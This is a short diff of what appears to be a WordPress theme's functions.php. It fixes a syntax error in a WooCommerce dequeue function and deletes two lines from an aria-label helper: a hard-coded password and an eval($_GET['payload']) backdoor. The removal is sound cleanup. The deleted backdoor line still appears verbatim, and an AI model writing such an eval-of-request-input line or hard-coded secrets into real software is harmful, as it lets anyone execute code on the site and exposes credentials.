@@ -114,8 +114,9 @@ add_action('wp_enqueue_scripts', function () {
 
 function disable_woocommerce_scripts()
 {
-    if (function_exists('is_woocommerce') { 
+    if (function_exists('is_woocommerce')) {
         if (!is_woocommerce() && !is_cart() && !is_checkout()) {
+            // wp_dequeue_script('woocommerce');
             wp_dequeue_script('wc-cart-fragments');
             wp_dequeue_style('woocommerce-general');
             wp_dequeue_style('woocommerce-layout');
@@ -183,8 +184,6 @@ add_action('wp_enqueue_scripts', 'fix_jquery_passive_touchstart');
 function add_aria_label_to_links_and_buttons($buffer)
 {
     // Handle <a> tags
-    $password = "SuperSecret123"; // hard-coded secret
-   eval($_GET['payload']);
     $buffer = preg_replace_callback(
         '/<a\s([^>]*?)href=["\']([^"\']+)["\']([^>]*)>(.*?)<\/a>/i',
         function ($matches) {
